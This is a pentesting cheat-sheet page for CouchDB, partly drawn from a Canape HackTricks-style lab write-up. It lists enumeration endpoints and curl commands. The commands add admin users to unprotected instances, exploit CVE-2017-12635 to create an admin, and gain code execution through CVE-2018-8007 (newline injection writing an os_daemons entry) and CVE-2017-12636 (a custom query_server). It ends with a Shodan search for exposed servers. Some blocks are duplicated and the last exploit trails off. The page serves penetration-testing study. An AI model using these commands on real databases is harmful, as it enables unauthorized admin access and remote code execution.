## Fundamentals

https://justi.cz/security/2017/11/14/couchdb-rce-npm.html

## Testing for couchDB
```bash
http://test.site/search.php?submit=Submit&search=_all_docs
or 
http://test.site/search.php?submit=Submit&search=_changes
```

### Adding new admin through unprotected CouchDB 1.x
```url
curl -s -X PUT http://test.site:5984/_config/admins/rob -d '"123456"'
```

### Adding new admin through unprotected CouchDB 2.x
```url
curl -s -X PUT http://test.site:5984/_node/<NODENAME/_config/admins/root -d '"123456"'
# The defailt node is "nonode@nohost", try "couchdb@localhost" as a node as well.
# All available nodes can be found through curl -X GET http://test.site:5984/_membership
```

# 5984,6984 - Pentesting CouchDB

## **Basic Information**

CouchDB is a document-oriented database and within each document fields are stored as key-value maps. Fields can be either a simple key/value pair, list, or map.

Each document that is stored in the database is given a document-level unique identifier \(`_id`\) as well as a revision \(`_rev`\) number for each change that is made and saved to the database.

**Default port:** 5984\(http\), 6984\(https\)

```text
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```

## **Automatic Enumeration**

```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```

## Manual Enumeration

### Banner

```text
curl http://IP:5984/
```

This issues a GET request to installed CouchDB instance. The reply should look something like on of the following:

```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```

{% hint style="info" %}
Note that if accessing the root of couchdb you receive a `401 Unauthorized` with something like this: `{"error":"unauthorized","reason":"Authentication required."}` **you won't be able to access** the banner or any other endpoint.
{% endhint %}

### Info Enumeration

These are the endpoints where you can access with a **GET** request and extract some interesting info. You can find [**more endpoints and more detailed descriptions in the couchdb documentation**](https://docs.couchdb.org/en/latest/api/index.html).

* **`/_active_tasks`** List of running tasks, including the task type, name, status and process ID.
* **`/_all_dbs`**Returns a list of all the databases in the CouchDB instance.
* **`/_cluster_setup`**Returns the status of the node or cluster, per the cluster setup wizard.
* **`/_db_updates`** Returns a list of all database events in the CouchDB instance. The existence of the `_global_changes` database is required to use this endpoint.
* **`/_membership`** Displays the nodes that are part of the cluster as `cluster_nodes`. The field `all_nodes` displays all nodes this node knows about, including the ones that are part of the cluster.
* **`/_scheduler/jobs`** List of replication jobs. Each job description will include source and target information, replication id, a history of recent event, and a few other things.
* **`/_scheduler/docs`** List of replication document states. Includes information about all the documents, even in `completed` and `failed` states. For each document it returns the document ID, the database, the replication ID, source and target, and other information.
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** The `/_node/{node-name}` endpoint can be used to confirm the Erlang node name of the server that processes the request. This is most useful when accessing `/_node/_local` to retrieve this information.
* **`/_node/{node-name}/_stats`** The `_stats` resource returns a JSON object containing the statistics for the running server.  The literal string `_local` serves as an alias for the local node name, so for all stats URLs, `{node-name}` may be replaced with `_local`, to interact with the local node’s statistics.
* **`/_node/{node-name}/_system`** The \_systemresource returns a JSON object containing various system-level statistics for the running server_._ You can use \_\_`_local` as {node-name} to get current node info.
* **`/_node/{node-name}/_restart`**
* **`/_up`** Confirms that the server is up, running, and ready to respond to requests. If [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance_mode) is `true` or `nolb`, the endpoint will return a 404 response.
* **`/_uuids`**Requests one or more Universally Unique Identifiers \(UUIDs\) from the CouchDB instance.
* **`/_reshard`**Returns a count of completed, failed, running, stopped, and total jobs along with the state of resharding on the cluster.

More interesting information can be extracted as explained here: [https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **Database List**

```text
curl -X GET http://IP:5984/_all_dbs
```

If that request **responds with a 401 unauthorised**, then you need some **valid credentials** to access the database:

```text
curl -X GET http://user:password@IP:5984/_all_dbs
```

In order to find valid Credentials you could **try to** [**bruteforce the service**](../brute-force.md#couchdb).

This is an **example** of a couchdb **response** when you have **enough privileges** to list databases \(It's just a list of dbs\):

```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```

### Database Info

You can obtain some database info \(like number of files and sizes\) accessing the database name:

```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```

### **Document List**

List each entry inside a database

```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```

### **Read Document**

Read the content of a document inside a database:

```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```

## CouchDB Privilege Escalation  [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

Thanks to the differences between Erlang and JavaScript JSON parsers you could **create an admin user** with credentials `hacktricks:hacktricks` with the following request:

```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```

\*\*\*\*[**More information about this vuln here**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### Erlang Cookie

In the CouchDB docs, in the [cluster set-up section](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup), it talks about the different ports used by CouchDB:

> CouchDB in cluster mode uses the port `5984` just as standalone, but it also uses `5986` for node-local APIs.
>
> Erlang uses TCP port `4369` \(EPMD\) to find other nodes, so all servers must be able to speak to each other on this port. In an Erlang Cluster, all nodes are connected to all other nodes. A mesh.

And then there’s an interesting warning:

![1536931232858](https://0xdf.gitlab.io/img/1536931232858.png)

If we look in the process list, we can see that cookie, “monster”:

```text
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```

**You can**[ **read this section to learn how to abuse Erlangs cookies to obtain RCE**](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.**  
Also, you can read some **Canape HTB machine writeup** [**like this one**](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution) to see and **practice** how to **exploit this vuln**.

### **Successful CVE-2018-8007 with local.ini write permissions**

In writing this post, I found a new CVE had been released for CouchDB from mdsec, [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/). It also requires writes to the `local.ini` file, so it isn’t a useful option for Canape. But since I’ve already made it writable as root, let’s see if we can get it to work.

Start with a clean and now writable `local.ini` \(and a backup\):

```text
root@canape:/home/homer/etc# ls -l
total 40
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```

We can use curl to modify the origins in the `local.ini` file. The vulnerability here is that if we use curl to put a new origin and then newlines, we can write additional stuff, including a new header and details. So we’ll take advantage of the `[os_daemons]` field, and add a process for CouchDB to try to keep running:

```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```

In the root shell, we can see what changes:

```text
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
<
< [cors]
< origins = 0xdf
<
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```

And yet, the file isn’t there:

```text
root@canape:/home/homer/etc# ls /tmp/0xdf
ls: cannot access '/tmp/0xdf': No such file or directory
```

If we look at the processes running with “couchdb” in the cmdline, we see not only the line command line that gives us the cookie value we used earlier, but also `runsrv couchdb`:

```text
root@canape:/home/homer/bin# ps aux | grep couch
root        711  0.0  0.0   4240   696 ?        Ss   14:28   0:00 runsv couchdb
root        728  0.0  0.0   4384   812 ?        S    14:28   0:00 svlogd -tt /var/log/couchdb
homer      1785  0.8  3.1 638992 31248 ?        Sl   17:55   0:01 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bi
n/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
```

If we kill that process, it comes right back \(notice the new pid\):

```text
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ps aux | grep runsrv
root       2031  0.0  0.0  14224   980 pts/2    S+   18:09   0:00 grep --color=auto runsrv
```

And, on restart, runs the OS\_Daemons:

```text
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```

### **Successful Attempt Via CVE-2017-12636 with local.ini write permissions**

CVE-2017-12636 allows for code execution through the couchdb process. However, it won’t work in this configuration.

There are a few POCs out there as reference:

* [https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
* [https://www.exploit-db.com/exploits/44913/](https://www.exploit-db.com/exploits/44913/)

We’d need to write a new query\_server, and then invoke that. When Canape was released, most of the POCs were for couchdb 1.x, but this box is running 2, so the query\_servers path from most of the POCs doesn’t exist. That’s changed now, but we’ll walk the same steps. First, get the version, and show that the 1.X path doesn’t exist:

```bash
www-data@canape:/var/www/git$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_config/query_servers/
{"error":"not_found","reason":"Database does not exist."}
```

Update with the new path for 2.0:

```bash
www-data@canape:/var/www/git$ curl 'http://0xdf:df@localhost:5984/_membership'
{"all_nodes":["couchdb@localhost"],"cluster_nodes":["couchdb@localhost"]}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
{"coffeescript":"./bin/couchjs ./share/server/main-coffee.js","javascript":"./bin/couchjs ./share/server/main.js"}
```

From there, we should add a query\_server and then invoke it, but we aren’t able to.

```bash
www-data@canape:/var/www/git$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
{"error":"badmatch","reason":"{badrpc,{'EXIT',{{{badmatch,{error,eacces}},\n                  [{config_writer,save_to_file,2,\n                                  [{file,\"src/config_writer.erl\"},{line,38}]},\n                   {config,handle_call,3,[{file,\"src/config.erl\"},{line,222}]},\n                   {gen_server,try_handle_call,4,\n                               [{file,\"gen_server.erl\"},{line,629}]},\n                   {gen_server,handle_msg,5,\n                               [{file,\"gen_server.erl\"},{line,661}]},\n                   {proc_lib,init_p_do_apply,3,\n                             [{file,\"proc_lib.erl\"},{line,240}]}]},\n                 {gen_server,call,\n                             [config,\n                              {set,\"query_servers\",\"cmd\",\n                                   \"/sbin/ifconfig > /tmp/df\",true,nil}]}}}}","ref":1617834159}
```

Some Googling shows that this is an issue with permissions. In fact, if we check with out root shell, we can see that the `local.ini` file is not writable by anyone, let alone www-data:

```text
root@canape:/home/home/etc# ls -ls local.ini
8 -r--r--r-- 1 homer homer 4841 Sep 14 17:11 local.ini
```

So that’s a dead end for Canape. But if we want to try to get it working, we can make it readable with our root or homer access, and continue down this path. We’ll make a backup of the original so we can see what changes:

```text
root@canape:/# cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
root@canape:/# chmod 666 /home/homer/etc/local.ini
```

Now, back to our www-data shell:

```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```

```text
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```

We get back the previous value for the cmd query server, which means success. And in the root shell, we can see it worked:

```text
root@canape:/home/homer/etc# diff local.ini local.ini.bk
48c48
< cmd = /sbin/ifconfig > /tmp/df
---
> cmd =
```

Now, we should be able to create a db, and then a document in that db, and the request it with a view that maps our query\_server to get execution.

Create db and document:

```bash
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```

```text
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```

Request it in a view:

```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}' -H "Content-Type: application/json"
```

#### [Summary](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0) with a different payload

## Shodan

* `port:5984 couchdb`

## References

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html\#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)
